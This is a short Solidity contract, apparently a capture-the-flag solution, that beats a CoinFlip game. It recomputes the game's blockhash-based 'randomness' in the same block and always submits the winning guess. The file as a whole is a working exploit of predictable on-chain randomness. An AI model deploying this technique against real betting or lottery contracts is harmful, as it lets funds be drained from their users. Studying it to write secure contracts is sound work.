// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuesser {
  
  using SafeMath for uint256;
  ICoinFlip coinFlip;
  uint256 public consecutiveGuesses;
  uint256 lastHash;
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
      consecutiveGuesses = 0;
  }

  function guessFlip(address _coinFlipAddr) external returns (uint256) {
      uint256 blockValue = uint256(blockhash(block.number - 1)); 

      if(lastHash == blockValue) {
          revert();
      }

      lastHash = blockValue;
      bool guess = (blockValue / FACTOR) == 1 ? true : false;
      bool result = ICoinFlip(_coinFlipAddr).flip(guess);
      if (result) consecutiveGuesses ++;
      else consecutiveGuesses = 0;
      return consecutiveGuesses;
  }
}